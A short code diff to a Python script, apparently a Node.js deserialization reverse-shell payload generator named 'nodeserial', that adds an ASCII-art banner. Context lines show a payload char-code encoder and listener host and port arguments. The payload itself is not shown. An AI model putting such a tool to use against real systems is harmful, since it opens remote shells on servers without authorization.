@@ -34,7 +34,15 @@ def encode_ord(revshell_payload_nodejs):
         encoded = encoded + "," + str(ord(char))
     return encoded[1:]
 
-parser = argparse.ArgumentParser(formatter_class=RawTextHelpFormatter, usage="python nodeserial.py -l <ip> -p <port>")
+def msg():
+    return print("""                 _                     _       _ 
+                | |                   (_)     | |
+ _ __   ___   __| | ___  ___  ___ _ __ _  __ _| |
+| '_ \ / _ \ / _` |/ _ \/ __|/ _ \ '__| |/ _` | |
+| | | | (_) | (_| |  __/\__ \  __/ |  | | (_| | |
+|_| |_|\___/ \__,_|\___||___/\___|_|  |_|\__,_|_|
+    """)
+parser = argparse.ArgumentParser(description=msg(),formatter_class=RawTextHelpFormatter, usage="python nodeserial.py -l <ip> -p <port>")
 parser.add_argument('-l','--lhost', dest='lhost', action='store', type=str, help='Insert an lhost', required=True)
 parser.add_argument('-p','--lport', dest='lport', action='store', type=str, help='Insert an lport', required=True)
 parser.add_argument('-params','--params', dest='params', action='store', type=str, help='Insert an params')
